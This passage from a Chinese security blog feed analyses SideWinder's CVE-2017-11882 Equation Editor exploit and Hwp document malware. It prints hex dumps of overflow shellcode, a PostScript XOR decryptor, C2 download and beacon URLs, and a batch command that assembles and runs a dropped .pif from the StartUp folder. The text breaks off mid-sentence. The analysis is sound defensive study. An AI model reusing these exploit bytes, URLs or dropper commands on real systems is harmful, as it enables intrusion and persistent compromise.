Stream</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据银雁冰所提到的参考文献<a href="http://web.archive.org/web/20010304111449/http:/mathtype.com:80/support/tech/MTEF_storage.htm#OLE%20Objects" target="_blank" rel="external">http://web.archive.org/web/20010304111449/http:/mathtype.com:80/support/tech/MTEF_storage.htm#OLE%20Objects</a>，EQNOLEFILEHDR结构体如下：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">struct EQNOLEFILEHDR &#123;</div><div class="line">    WORD    cbHdr;     <span class="regexp">//</span> length of header, sizeof(EQNOLEFILEHDR) = <span class="number">28</span> bytes</div><div class="line">    DWORD   version;   <span class="regexp">//</span> hiword = <span class="number">2</span>, loword = <span class="number">0</span></div><div class="line">    WORD    cf;        <span class="regexp">//</span> clipboard format (<span class="string">"MathType EF"</span>)</div><div class="line">    DWORD   cbObject;  <span class="regexp">//</span> length of MTEF data following this header <span class="keyword">in</span> bytes</div><div class="line">    DWORD   reserved1; <span class="regexp">//</span> <span class="keyword">not</span> used</div><div class="line">    DWORD   reserved2; <span class="regexp">//</span> <span class="keyword">not</span> used</div><div class="line">    DWORD   reserved3; <span class="regexp">//</span> <span class="keyword">not</span> used</div><div class="line">    DWORD   reserved4; <span class="regexp">//</span> <span class="keyword">not</span> used</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<a href="http://web.archive.org/web/20010304041035/http:/mathtype.com:80/support/tech/MTEF3.htm#Introduction" target="_blank" rel="external">http://web.archive.org/web/20010304041035/http:/mathtype.com:80/support/tech/MTEF3.htm#Introduction</a>,MTEF header结构体如下：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">struct MTEFHEADER&#123;</div><div class="line"><span class="keyword">BYTE</span> version</div><div class="line"><span class="keyword">BYTE</span> platform: <span class="number">0</span> <span class="keyword">for</span> MAC ,<span class="number">1</span> <span class="keyword">for</span> Win</div><div class="line"><span class="keyword">BYTE</span> product: <span class="number">0</span> <span class="keyword">for</span> Math Type,<span class="number">1</span> <span class="keyword">for</span> Equation Editor</div><div class="line"><span class="keyword">BYTE</span> product version:<span class="number">3</span></div><div class="line"><span class="keyword">BYTE</span> product subversion</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MTEF Byte Stream的结构体大致如下：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">struct MTEFByteStream&#123;</div><div class="line">BYTE SIZE <span class="built_in">record</span>:大小</div><div class="line">BYTE PILE <span class="keyword">or</span> LINE <span class="built_in">record</span>：Tag</div><div class="line"><span class="built_in">contents</span> <span class="keyword">of</span> PILE <span class="keyword">or</span> LINE：<span class="built_in">contents</span> <span class="keyword">of</span> Tag</div><div class="line">END <span class="built_in">record</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FONT Record 结构体如下：<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line"><span class="keyword">tag</span>   <span class="title"></span></div><div class="line"><span class="title">typeface</span> <span class="keyword">number</span></div><div class="line">style</div><div class="line">font name</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们使用一份非变形的CVE-2017-11882样本的Equation Native Stream Data数据来查看一下上述结构体的对应情况。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>c00         <span class="comment">//cbHdr</span></div><div class="line"><span class="number">00000200</span>     <span class="comment">//version</span></div><div class="line">a8c3         <span class="comment">//clipboard format</span></div><div class="line"><span class="number">99020000</span>     <span class="comment">// cbObject </span></div><div class="line"><span class="number">00000000</span>     <span class="comment">//reserved1</span></div><div class="line"><span class="number">48905</span>d00     <span class="comment">//reserved2</span></div><div class="line"><span class="number">6</span>c9c5b00     <span class="comment">//reserved3</span></div><div class="line"><span class="number">00000000</span>     <span class="comment">//reserved4</span></div><div class="line"></div><div class="line"><span class="number">03</span>           <span class="comment">//MTEF_version</span></div><div class="line"><span class="number">01</span>           <span class="comment">//MTEF_platform</span></div><div class="line"><span class="number">01</span>           <span class="comment">//MTEF_product</span></div><div class="line"><span class="number">03</span>           <span class="comment">//MTEF_product version</span></div><div class="line"><span class="number">0</span>a           <span class="comment">//MTEF_product subversion</span></div><div class="line"></div><div class="line"><span class="number">0</span>a           <span class="comment">//SIZE</span></div><div class="line"><span class="number">01</span>           <span class="comment">//可有可无</span></div><div class="line"><span class="number">08</span>           <span class="comment">//Font[tag]</span></div><div class="line"><span class="number">5</span>a           <span class="comment">//typeface</span></div><div class="line"><span class="number">5</span>a           <span class="comment">//style</span></div><div class="line">b844eb7112ba7856341231d08b088b098b096683c13cffe190909090909090909090909090909090909090901421400  <span class="comment">//fontname</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;了解完常规的poc，接下来看一下这次SideWinder本次攻击使用的真实样本大概是这样的<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">objdata</div><div class="line"><span class="number">01050000</span>                 <span class="comment">//OleVersion</span></div><div class="line"><span class="number">02000000</span>                 <span class="comment">//FormatId</span></div><div class="line"><span class="number">0</span>b000000                 <span class="comment">//ClassnameSize</span></div><div class="line"><span class="number">4571756174696</span>F6E2E3300   <span class="comment">//Equation.3</span></div><div class="line"><span class="number">00000000</span></div><div class="line"><span class="number">00000000</span></div><div class="line"><span class="number">81060000</span>                 <span class="comment">//SIZE</span></div><div class="line"></div><div class="line"><span class="number">02</span>   <span class="comment">//Equation Editor 3.x</span></div><div class="line">&#125;</div><div class="line">c3</div><div class="line"><span class="number">37</span></div><div class="line">C7</div><div class="line"><span class="number">05</span></div><div class="line"></div><div class="line">E5   <span class="comment">//size</span></div><div class="line"><span class="number">01</span></div><div class="line"><span class="number">08</span>   <span class="comment">//tag</span></div><div class="line"><span class="number">11</span>   <span class="comment">//typeface</span></div><div class="line">C6   <span class="comment">//style</span></div><div class="line">BA36646F1D81C20659D6E28B0A8B29BFBC6B22A681F70C0C64A68B1755FFD205D41275952D05127595FFE0E5B4264200</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EQNETD32.EXE通过OpenStream读取Equation流。<br>    <img src="http://hacky.wang/blog/20201227/jMUrvNOA9lOM.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显然，样本并不是读取了常见的Equation Native，而是01Ole10Native。因为如果是常见的Equation Native流，Equation流开头应该是0x1C开头，此处是以0x02开头。而且解析器在最终读取Equation流已经将}等符号自动屏蔽。<br>    <img src="http://hacky.wang/blog/20201227/qkMpigFh6uF1.png?imageslim" alt="mark">、</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图，tag = 8，说明这是一个Font Tag，然后将其传入sub_43A87A函数。<br>    <img src="http://hacky.wang/blog/20201227/JRpTXfREcx0d.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终在0041774e处获取Font的Name。并最终传入sub_4115A7。显然这已经超过了0x24个字节本身的长度。造成CVE-2017-11882漏洞。<br>    <img src="http://hacky.wang/blog/20201227/9JOs1KKA80ki.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20201227/ois76Cgwqour.png?imageslim" alt="mark"></p><h1 id="RunHTMLApplication如何加载js脚本"><a href="#RunHTMLApplication如何加载js脚本" class="headerlink" title="RunHTMLApplication如何加载js脚本"></a>RunHTMLApplication如何加载js脚本</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;恶意的shellcode最终会调用RunHTMLApplication执行js脚本，但是所传入的参数皆为null，所以RunHTMLApplication是如何加载js脚本的？如下是RunHTMLApplication的函数原型。可见第三个参数为调用的命令行参数。但是此参数为null，RunHTMLApplication是如何解析的呢？<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">HRESULT RunHTMLApplication(    </div><div class="line">   <span class="keyword">HINSTANCE</span> hinst,</div><div class="line">   <span class="keyword">HINSTANCE</span> hPrevInst,</div><div class="line">   LPSTR szCmdLine,</div><div class="line">   <span class="keyword">int</span> nCmdShow</div><div class="line">)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过分析mshtml.dll中的导出函数RunHTMLApplication可知，首先会调用GetCmdLine(void)函数，主要是通过GetCommandLineW()函数获取命令行参数，然后通过CreateHTAMoniker函数解析所得到的命令行数据，获取命令行中:之前的内容，然后根据注册表HKCR\SOFTWARE\Classes\PROTOCOLS\Handler\内容调用相关协议处理器解析处理。<br>    <img src="http://hacky.wang/blog/20201212/8xrpickAH8Q7.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20201212/UcsNSGku38k7.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是命令行参数是何时被修改的呢，在shellcode中，首先会利用GetCommandLine获取命令行参数，然后通过异或加密的方式加密该参数。最后通过RunHTMLApplication函数中的命令行解释器就可以获取到被修改的命令行参数。<br>    <img src="http://hacky.wang/blog/20201212/8ynnkp6jyCHq.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20201212/G8rfXJaQ7Axh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;命令行参数很简单，是几行js代码，主要是读取位于%temp%1.a的js脚本内容，并执行之。<br>    <img src="http://hacky.wang/blog/20201212/ajiGBWK5ImI0.png?imageslim" alt="mark"></p><h1 id="js如何反射加载C-程序"><a href="#js如何反射加载C-程序" class="headerlink" title="js如何反射加载C#程序"></a>js如何反射加载C#程序</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;光看代码，yMVonTE和dgDDmZRs很显然是用来加密后续需要使用到的一些属性。部分代码的加密逻辑是这样的，首先采用利用变形过的Base64去编码传入的原始字符串，然后再用生成出来的变形的Base64字符串进行两轮循环的加密，由此产生后续可以执行的代码流。<br>    <img src="http://hacky.wang/blog/20201222/KL0nj9sYRKbX.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以直接使用浏览器调试去进一步还原被加密之后的js代码，这里可以参考<a href="https://blog.csdn.net/magi1201/article/details/43927915" target="_blank" rel="external">这篇文章</a>，通过上述代码边解密，边执行的特性，很容易还原整个原始代码，整个流程主要分为两个部分，首先通过xnEVdV()函数去获取csc.exe文件的版本号，分别是V2的版本和V4的版本。<br>    <img src="http://hacky.wang/blog/20201222/YwX2VyR4qqyL.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩需要将被Base64编码过的Paload写入内存中。很显然，下一步需要执行的PE文件就在其中。<br>    <img src="http://hacky.wang/blog/20201222/3nG13kNEKFxJ.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20201222/Alny7wACvqPD.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在公众号中已经介绍了使用到的技术是DotNetToJScript，在其github上下载到了DotNetToJScript项目，并利用VS2015进行编译，利用官网所提供的参数编译得到一份Test.js,通过对比Testjs和去混淆之后的js脚本，发现流程基本一致。都是利用CreateInstance创建一个实例，然后调用方法的方式进行反射注入的。<br>    <img src="http://hacky.wang/blog/20201222/BlNfWXuzUR6d.png?imageslim" alt="mark"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本次攻击还是采用SideWinder过去经常使用的攻击技巧，变化不大，但适合没有接触的师傅共同学习，探讨。</p><ol><li><a href="https://www.anquanke.com/post/id/87311" title="CVE-2017-11882漏洞分析、利用及动态检测" target="_blank" rel="external">CVE-2017-11882漏洞分析、利用及动态检测</a></li><li><a href="响尾蛇组织近期针对我国特定机构的APT攻击活动披露" title="https://mp.weixin.qq.com/s?__biz=MzUyMjk4NzExMA==&amp;mid=2247485130&amp;idx=1&amp;sn=66370e46076a1f6da38fe3d690948550&amp;chksm=f9c235c3ceb5bcd543190ca1d4db4654f4131db1f1efd38dfe1197a270704ea4dc998c5d689e&amp;mpshare=1&amp;scene=1&amp;srcid=1119NcpmfwcPjYaDTTXuHiEH&amp;sharer_sharetime=1606020755577&amp;sharer_shareid=4c4694001f449570936fa531f032aaa9&amp;key=cac79074cb1ad8d8d6ee1057f5e579c1d515941b41aaf910ff8d3fa3c22658f05f379ae9459c5608ec49bb0617c1e4bee8b2bd5743c2568345a35c90a41e070cafad74ff64eb9f5bf445d0364dd70a0c60e788a39fbede239a98c340ea7656d157cebe65f23af06a3605aad5e0629c095f0164fe123386f13185944e46ede27d&amp;ascene=1&amp;uin=Mjc5NjE0NTA0MA%3D%3D&amp;devicetype=Windows+7+x64&amp;version=6300002f&amp;lang=zh_CN&amp;exportkey=A0eOXsbA3QVKpIHtl%2FDecyI%3D&amp;pass_ticket=EREBvV87%2FHVI7ra1M9PIxhT4yvmc7xpEULsE4FHBfVWU6Nxb2%2BZ8qyVeu6RqTFOi&amp;wx_header=0">响尾蛇组织近期针对我国特定机构的APT攻击活动披露</a></li><li><a href="利用JS加载.Net程序" title="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/">利用JS加载.Net程序</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;背景与前言&quot;&gt;&lt;a href=&quot;#背景与前言&quot; class=&quot;headerlink&quot; title=&quot;背景与前言&quot;&gt;&lt;/a&gt;背景与前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;根据360和微步在线公众号披露的情报称，从今年(2020年)11月份起，SideWinder开始策划针对中国的定向攻击。正如360威胁情报中心公众号所说，本次攻击是SideWinder利用邮件等方式传播带有远程模板的恶意文档发动的一次攻击，具体过程如下，首先利用远程模板注入从远程C2服务器上加载含有CVE-2017-11882漏洞的文档，之后执行恶意payload，加载释放在%temp%中的恶意js文件，该js脚本采用内存反射加载的方式执行C#文件，进而部署恶意后门程序。&lt;br&gt;
    
    </summary>
    
      <category term="windows安全" scheme="https://findream.github.io/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Hwp_文本类型样本分析总结</title>
    <link href="https://findream.github.io/2019/07/18/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_24_Hwp%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/"/>
    <id>https://findream.github.io/2019/07/18/病毒分析技术_24_Hwp样本分析总结/</id>
    <published>2019-07-18T07:02:11.000Z</published>
    <updated>2021-03-27T08:07:52.136Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前言略过，日后补齐~~<br><a id="more"></a></p><h1 id="0x1-什么是HWP"><a href="#0x1-什么是HWP" class="headerlink" title="0x1 什么是HWP"></a>0x1 什么是HWP</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HWP全称是Hangul Word Processor，意为Hangul文字处理软件。主要为韩国国内提供服务。韩国国内市场占有率为75%以上。功能类似于国内的WPS或者微软的office组件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参考自：<a href="https://ti.360.net/blog/articles/analysis-of-group123-sample-with-hwp-exploitkit/" target="_blank" rel="external">https://ti.360.net/blog/articles/analysis-of-group123-sample-with-hwp-exploitkit/</a></p><h1 id="0x2-Hwp样本概述与分析思路"><a href="#0x2-Hwp样本概述与分析思路" class="headerlink" title="0x2 Hwp样本概述与分析思路"></a>0x2 Hwp样本概述与分析思路</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hwp和office一样，有至少两种攻击手段。一种是类似于(就是)宏样本，与office不同的是，office使用的是vb的脚本语言，而Hwp使用的是称为PostScript的脚本语言。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PostScript（PS）是主要用于电子产业和桌面出版领域的一种页面描述语言和编程语言。PostScript是一种基于堆栈的解释语言（例如stack language），它类似于Forth语言但是使用从Lisp语言派生出的数据结构。这种语言的语法使用<strong>逆波兰表示法</strong>，这就意味着不需要括号进行分割，但是因为需要记住堆栈结构，<strong>所以需要进行训练才能阅读这种程序。</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二种就是利用hwp本身的漏洞，使用包括但不限于溢出，类型混淆之类的漏洞，改变程序的执行流，进而实施攻击。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述所说，针对Hwp样本分析思路就是：首先使用hwpscan查看一下hwp文件基本结构，重点是是否存在ps文件。这样就排除他不是宏样本。接着查看目录是否存在esp文件，如果有就有很大概率说明是利用了某个esp漏洞。排除上述两种之后，如果文档打开会奔溃，那么就可能存在其他漏洞。可以使用vt去搜索一下。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参考自：<a href="https://zh.wikipedia.org/wiki/PostScript" title="PostScript描述" target="_blank" rel="external">https://zh.wikipedia.org/wiki/PostScript</a></p><h1 id="0x3-宏类型样本"><a href="#0x3-宏类型样本" class="headerlink" title="0x3 宏类型样本"></a>0x3 宏类型样本</h1><ul><li>IoC:106f24660aa878c6aaa5f30422d1916b</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先使用HwpScan2工具打开样本文件。HwpScan2工具下载地址为<a href="https://www.nurilab.net/hwpscan2" target="_blank" rel="external">https://www.nurilab.net/hwpscan2</a>，可以看到存在一个BinData节。<br>    <img src="http://hacky.wang/blog/20190718/okBpHamjzgpb.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将其Decompress转储出来，可以看到，根据PostScript语句如下代码是将Y101数组与<code>ED60732AA6FE818830ADCAE0C84717EE</code>这个key进行异或。解密得到下一层的混淆代码。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">sub</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">/Y18 exch <span class="number">1</span> <span class="number">2</span> <span class="keyword">and</span> <span class="keyword">pop</span> def</div><div class="line">Y101 dup Y18 </div><div class="line">get &lt;ED60732AA6FE818830ADCAE0C84717EE&gt; </div><div class="line">Y18 <span class="number">15</span> <span class="keyword">and</span> /Y104 <span class="number">8</span> def get <span class="keyword">xor</span> Y18 exch put</div><div class="line">&#125; <span class="keyword">for</span> Y101 cvx <span class="keyword">exec</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下图<br>    <img src="http://hacky.wang/blog/20190718/aWbpjaIoJCpQ.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190718/u8cyRDTbOXIF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;得到新的加密ps代码。通读代码发现大致逻辑是将数组/Y77与Y17 Y99 16#24相加如下代码：<br>   <code>Y77 length Y17 Y99 16#24 add</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时有两个思路，第一个，按照逻辑利用源码进行解密。第二个对PostScript解析器进行调试。这里使用第二种。使用调试的方法由有两种方法，第一，利用OD直接打开gbb.exe(在Hwp安装路径之下)，在参数传入第一层解密好的文件。如下图1为此方法。<br>    <img src="http://hacky.wang/blog/20190718/r6CVmJ9r8EeM.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二种方法是，利用进程镜像劫持，启动调试器，然后开始调试，这是调试漏洞的常见方法。<br>    <img src="http://hacky.wang/blog/20190718/rb8qYFJhKM6A.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主要讲一下思路：通过观察，目标是解密Hex数据串。我们只需要知道解密的数据即可。首先对CreateFile下断，然后对ReadFile下断。查看Buffer。待读入Hex之后下内存断点(不知道硬件断点为何失败)。然后F9，慢慢跟待到对Hex解密即可。<br>    <img src="http://hacky.wang/blog/20190718/33EnUteq3PJo.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190718/yErIDoMzlvPb.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下，组织利用Hwp文档进行恶意代码投递。使用到的样本(本样本)利用Hwp宏(没有漏洞)经过两次解密，得到一个具有联网功能的shellcode。然后通过访问<code>https://www.calderonflooring[.]com/wp-content/uploads/2018/webfont1.dat</code>和<code>https://www.calderonflooring[.]com/wp-content/uploads/2018/webfont2.dat</code>下载两个PE文件。</p><h2 id="PE分析"><a href="#PE分析" class="headerlink" title="PE分析"></a>PE分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;webfont1.dat和webfont2.dat实质上是两个PE文件，且两者是同一份源代码，但是webfont1.dat是X86,webfont2.dat是X64的。<br>    <img src="http://hacky.wang/blog/20190723/iqNNqHnTetHF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主要通过构造Http请求，使用Post方式，请求<code>https://www.mantoolmfg.com/wp-content/plugins/simple-sitemap/about.php</code>,<code>https://justintimecorp.com/wp-content/plugins/wordpress-seo/left.php</code>,<code>https://psalmsfm.org/wp-content/plugins/donate-plus/pay.php</code>url。然后通过WinHttpReceiveResponse等API接收和校验响应报文。使用WinHttpReadData并读取响应的数据<br>     <img src="http://hacky.wang/blog/20190723/F4MP53jc7ED2.png?imageslim" alt="mark"><br>     <img src="http://hacky.wang/blog/20190723/bXOVHqVen2rU.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过读取响应实现远控目的。命令为0x38CE55u时，为获取计算机盘符并发送。为0x21279Eu时，为从云端读取数据，并写入本地。当命令为0x2AFCB2u操作读取机器信息，并发送。当 Commond &gt; 0x48D6FC时。执行cmd.exe.<br>当Commond == 4773628。执行进程映射。<br>    <img src="http://hacky.wang/blog/20190723/EnqUOs4Oyx6V.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190723/30bUhBJFW6m0.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190723/SsigMfqwe4xl.png?imageslim" alt="mark"></p><ul><li>URL<ul><li><a href="https://www.mantoolmfg.com/wp-content/plugins/simple-sitemap/about.php" target="_blank" rel="external">https://www.mantoolmfg.com/wp-content/plugins/simple-sitemap/about.php</a></li><li><a href="https://justintimecorp.com/wp-content/plugins/wordpress-seo/left.php" target="_blank" rel="external">https://justintimecorp.com/wp-content/plugins/wordpress-seo/left.php</a></li><li><a href="https://psalmsfm.org/wp-content/plugins/donate-plus/pay.php" target="_blank" rel="external">https://psalmsfm.org/wp-content/plugins/donate-plus/pay.php</a></li></ul></li></ul><h1 id="0x4-GhostScript沙箱绕过漏洞"><a href="#0x4-GhostScript沙箱绕过漏洞" class="headerlink" title="0x4 GhostScript沙箱绕过漏洞"></a>0x4 GhostScript沙箱绕过漏洞</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先使用HwpScan2提取样本文件，发现存在eps文件，EPS是Encapsulated Post Script的缩写，是一个专用的打印机描述语言，可以描述矢量信息和位图信息，支持跨平台。<br>    <img src="http://hacky.wang/blog/20190719/X461TzKL5W6B.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过查看BIN0006.eps，可以发现样本进行如下操作：首先获取了appdata的路径，然后字符串凭借形成%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\UpgradeVer45.bat。将<code>copy /b &quot;%appdata%\\*.oju01&quot; &quot;%appdata%\\WinUpdate148399843.pif&quot; &amp; &quot;%appdata%\\WinUpdate148399843.pif&quot; &amp; del /f &quot;%appdata%\\WinUpdate148399843.pif</code>写入UpgradeVer45.bat。<br>     <img src="http://hacky.wang/blog/20190719/bzGRV72GBxlu.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着创建\Dhh01.oju01和\Dhh02.oju01，将MZ标志写入\Dhh01.oju01，然后循环读取closefile的Hex串。写入\Dhh02.oju01.<br>    <img src="http://hacky.wang/blog/20190719/1m5l7yv9f0ud.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这条语句<code>copy /b &quot;%appdata%\*.oju01&quot; &quot;%appdata%\WinUpdate148399843.pif&quot; &amp; &quot;%appdata%\WinUpdate148399843.pif&quot; &amp; del /f &quot;%appdata%\WinUpdate148399843.pif&quot;</code>作用是将两个文件拼接在一起。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;漏洞分析：通过上述分析，我们知道脚本功能是释放三个文件到启动目录，但是GhostScript提供了一个名为“-dSAFER”的参数来将EPS脚本的解析过程放到安全沙箱中执行，以防止诸如任意文件写这类高危操作发生。但是Hancom Office自带的使用GhostScript源代码开发出来的程序并没有使用这个参数。也就是说，Hancom Office自带的解释器没有安全沙箱这样的高危操作缓解的措施。也就间接的造成了沙箱绕过漏洞。<br>    <img src="http://hacky.wang/blog/20190719/uHUIOrxvkrOP.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们重新理一下Hwp漏洞触发的流程，首先，当我们使用Hancom 